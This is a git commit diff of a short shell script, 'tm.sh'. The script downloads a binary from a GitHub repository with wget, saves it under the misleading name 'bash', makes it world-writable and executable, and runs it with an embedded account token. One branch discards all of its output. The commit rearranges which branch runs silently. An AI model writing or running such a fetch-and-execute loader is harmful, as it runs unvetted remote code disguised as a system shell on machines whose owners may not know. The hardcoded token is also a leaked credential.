f1ad2b443bff252b305978a154526866bc585d99
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2025-04-10 10:10:12 +0800

    Update tm.sh

--- tm.sh
+++ tm.sh
@@ -4,9 +4,8 @@ token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
 tmp="$(mktemp -d)" && cd "$tmp"
 wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
 chmod 777 "./bash"
-echo "$pwd"
 if [ "$1" == "1" ]; then
-  bash -x <(echo "./bash start accept --token '${token}'")
+  ./bash start accept --token "${token}" >/dev/null 2>&1
 else
-  bash <(echo "./bash start accept --token '${token}'") >/dev/null 2>&1 &
+  ./bash start accept --token "${token}"
 fi
